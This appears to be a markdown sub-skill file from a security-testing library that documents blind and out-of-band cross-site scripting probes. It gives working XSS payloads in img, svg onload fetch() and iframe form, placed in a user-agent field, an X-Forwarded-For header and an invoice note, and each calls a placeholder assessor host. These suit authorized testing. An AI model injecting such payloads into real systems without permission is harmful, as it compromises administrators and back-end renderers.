# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`cross-site-scripting-blind-and-oob-xss`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `cross-site-scripting-blind-and-oob-xss`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### Correlated callback marker

**Expected differential:** the privileged render emits a unique per-record callback; no callback with the record confirmed stored is a non-finding

```text
user_agent=<img src=https://<assessor-controlled-host>/bxss/case-a1 >
comment=blind-marker case-a1 (inert baseline confirming storage first)
```

### Metadata-field injection

**Expected differential:** a header-sourced field surfaces in a log viewer and requests the correlated callback only when rendered active

```text
X-Forwarded-For: <svg/onload=fetch('https://<assessor-controlled-host>/bxss/case-a2')>
```

### Renderer-path probe

**Expected differential:** a field consumed by a server-side PDF or screenshot generator triggers the callback from the renderer's own egress

```text
invoice_note=<iframe src=https://<assessor-controlled-host>/bxss/case-a3 >
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
